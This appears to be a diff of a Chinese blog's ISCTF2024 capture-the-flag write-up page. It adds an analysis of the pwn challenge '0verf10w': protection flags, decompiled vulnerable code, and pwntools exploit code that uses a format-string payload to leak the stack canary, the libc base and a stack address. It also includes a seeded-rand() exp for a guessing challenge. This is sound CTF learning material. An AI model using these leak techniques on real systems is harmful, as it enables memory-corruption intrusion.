@@ -75,7 +75,7 @@
     <article class="article-wrap">
       <header class="article-header">
         <div class="post-meta">
-          <span>3272 字</span>
+          <span>4813 字</span>
         </div>
         <h1>ISCTF2024</h1>
         
@@ -114,7 +114,17 @@
 <p>是一道猜数的题目，尽管这道题目给了明显的栈溢出函数gets，但是由于这是在猜数循环前的，因此无法利用这个栈溢出。这道题目考查的就是伪随机数，这里就直接上exp了：</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">libc = ctypes.CDLL(libc_file)<br>libc.srand(1)<br><br>payload = b&#x27;a\n&#x27;<br>for _ in range(0x4e21):   # 20001<br>    payload += str(libc.rand() % 7 + 1).encode() + b&#x27;\n&#x27;<br>s(payload)<br></code></pre></td></tr></table></figure>
 
-<h2 id="0verf10w"><a href="#0verf10w" class="headerlink" title="0verf10w"></a>0verf10w</h2><h2 id="orange"><a href="#orange" class="headerlink" title="orange"></a>orange</h2><h2 id="ret2orw"><a href="#ret2orw" class="headerlink" title="ret2orw"></a>ret2orw</h2><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><h2 id="小蓝鲨stack"><a href="#小蓝鲨stack" class="headerlink" title="小蓝鲨stack"></a>小蓝鲨stack</h2><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Ezre"><a href="#Ezre" class="headerlink" title="Ezre"></a>Ezre</h2><h2 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h2><h2 id="py不好，会被ban"><a href="#py不好，会被ban" class="headerlink" title="py不好，会被ban"></a>py不好，会被ban</h2><h2 id="《回忆安魂曲》——第三章：逃不出的黑墙"><a href="#《回忆安魂曲》——第三章：逃不出的黑墙" class="headerlink" title="《回忆安魂曲》——第三章：逃不出的黑墙"></a>《回忆安魂曲》——第三章：逃不出的黑墙</h2><h2 id="《回忆安魂曲》——第二章：当记忆被割裂"><a href="#《回忆安魂曲》——第二章：当记忆被割裂" class="headerlink" title="《回忆安魂曲》——第二章：当记忆被割裂"></a>《回忆安魂曲》——第二章：当记忆被割裂</h2><h2 id="《回忆安魂曲》——第四章：退！初识凤仙儿"><a href="#《回忆安魂曲》——第四章：退！初识凤仙儿" class="headerlink" title="《回忆安魂曲》——第四章：退！初识凤仙儿"></a>《回忆安魂曲》——第四章：退！初识凤仙儿</h2><h2 id="你知道-elf文件嘛"><a href="#你知道-elf文件嘛" class="headerlink" title="你知道.elf文件嘛"></a>你知道.elf文件嘛</h2><h2 id="嘿嘿嘿"><a href="#嘿嘿嘿" class="headerlink" title="嘿嘿嘿"></a>嘿嘿嘿</h2><h2 id="找啊找"><a href="#找啊找" class="headerlink" title="找啊找"></a>找啊找</h2><h2 id="桀桀桀"><a href="#桀桀桀" class="headerlink" title="桀桀桀"></a>桀桀桀</h2><h2 id="萝卜子的螃蟹"><a href="#萝卜子的螃蟹" class="headerlink" title="萝卜子的螃蟹"></a>萝卜子的螃蟹</h2>
+<h2 id="0verf10w"><a href="#0verf10w" class="headerlink" title="0verf10w"></a>0verf10w</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">[*] &#x27;/mnt/d/国内赛/ISCTF2024/0verf10w/0verf10w&#x27;<br>    Arch:       amd64-64-little<br>    RELRO:      Full RELRO<br>    Stack:      Canary found<br>    NX:         NX enabled<br>    PIE:        PIE enabled<br>    SHSTK:      Enabled<br>    IBT:        Enabled<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
+
+<p>和题目描述的一样，保护全开，进入ida中进行分析</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">int __fastcall main(int argc, const char **argv, const char **envp)<br>&#123;<br>  __int64 buf_; // [rsp+0h] [rbp-20h] BYREF<br>  char format_[4]; // [rsp+8h] [rbp-18h] BYREF<br>  _BYTE v6[4]; // [rsp+Ch] [rbp-14h] BYREF<br>  unsigned __int64 v7; // [rsp+18h] [rbp-8h]<br><br>  v7 = __readfsqword(0x28u);<br>  init(argc, argv, envp);<br>  puts(&quot;welcome to ISCTF2024&quot;);<br>  puts(<br>    &quot;The person who set the questions intended to turn off all the protections, but it seems they... forgot? Can you help them out?&quot;);<br>  puts(&quot;By the way, can you tell me your name before that?&quot;);<br>  __isoc99_scanf(&quot;%s&quot;, v6);<br>  puts(&quot;Great, I&#x27;ve decided to give you a gift!&quot;);<br>  read(0, &amp;buf_, 0x20u);<br>  printf(format_);<br>  vuln();<br>  return 0;<br>&#125;<br>ssize_t vuln()<br>&#123;<br>  _QWORD buf_[4]; // [rsp+10h] [rbp-20h] BYREF<br><br>  buf_[3] = __readfsqword(0x28u);<br>  puts(&quot;again?????&quot;);<br>  return read(0, buf_, 0x21u);<br>&#125;<br>int greet()<br>&#123;<br>  return puts(&amp;s);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>存在格式化字符串漏洞可以泄漏很多东西，相应的代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">sl(b&quot;haoo&quot;)<br>payload = b&quot;a&quot; * 8 + b&quot;%9$p+%11$p+%15$p&quot;<br>s(payload)<br>io.recvuntil(b&quot;0x&quot;)<br>canary = int(io.recv(16), 16)<br>io.recvuntil(b&quot;0x&quot;)<br>libc_base = int(io.recv(12),16) - 0x29d90<br>io.recvuntil(b&quot;0x&quot;)<br>stack = int(io.recv(12),16)<br>leak(&quot;canary&quot;,canary)<br>leak(&quot;libc_base&quot;,libc_base)<br>leak(&quot;stack&quot;,stack)<br></code></pre></td></tr></table></figure>
+
+
+
+<h2 id="orange"><a href="#orange" class="headerlink" title="orange"></a>orange</h2><h2 id="ret2orw"><a href="#ret2orw" class="headerlink" title="ret2orw"></a>ret2orw</h2><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><h2 id="小蓝鲨stack"><a href="#小蓝鲨stack" class="headerlink" title="小蓝鲨stack"></a>小蓝鲨stack</h2><h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Ezre"><a href="#Ezre" class="headerlink" title="Ezre"></a>Ezre</h2><h2 id="MIPS"><a href="#MIPS" class="headerlink" title="MIPS"></a>MIPS</h2><h2 id="py不好，会被ban"><a href="#py不好，会被ban" class="headerlink" title="py不好，会被ban"></a>py不好，会被ban</h2><h2 id="《回忆安魂曲》——第三章：逃不出的黑墙"><a href="#《回忆安魂曲》——第三章：逃不出的黑墙" class="headerlink" title="《回忆安魂曲》——第三章：逃不出的黑墙"></a>《回忆安魂曲》——第三章：逃不出的黑墙</h2><h2 id="《回忆安魂曲》——第二章：当记忆被割裂"><a href="#《回忆安魂曲》——第二章：当记忆被割裂" class="headerlink" title="《回忆安魂曲》——第二章：当记忆被割裂"></a>《回忆安魂曲》——第二章：当记忆被割裂</h2><h2 id="《回忆安魂曲》——第四章：退！初识凤仙儿"><a href="#《回忆安魂曲》——第四章：退！初识凤仙儿" class="headerlink" title="《回忆安魂曲》——第四章：退！初识凤仙儿"></a>《回忆安魂曲》——第四章：退！初识凤仙儿</h2><h2 id="你知道-elf文件嘛"><a href="#你知道-elf文件嘛" class="headerlink" title="你知道.elf文件嘛"></a>你知道.elf文件嘛</h2><h2 id="嘿嘿嘿"><a href="#嘿嘿嘿" class="headerlink" title="嘿嘿嘿"></a>嘿嘿嘿</h2><h2 id="找啊找"><a href="#找啊找" class="headerlink" title="找啊找"></a>找啊找</h2><h2 id="桀桀桀"><a href="#桀桀桀" class="headerlink" title="桀桀桀"></a>桀桀桀</h2><h2 id="萝卜子的螃蟹"><a href="#萝卜子的螃蟹" class="headerlink" title="萝卜子的螃蟹"></a>萝卜子的螃蟹</h2>
         </div>
 
         
@@ -147,7 +157,7 @@
 
   <footer class="site-footer">
   <div class="site-footer__inner">
-    <p><strong>haoo&#39;s tech blog</strong><span aria-hidden="true"> / </span>35 篇记录<span aria-hidden="true"> / </span><a href="/rss.xml">RSS</a></p>
+    <p><strong>haoo&#39;s tech blog</strong><span aria-hidden="true"> / </span>31 篇记录<span aria-hidden="true"> / </span><a href="/rss.xml">RSS</a></p>
     <p>&copy; haoo · powered by Hexo</p>
   </div>
 </footer>
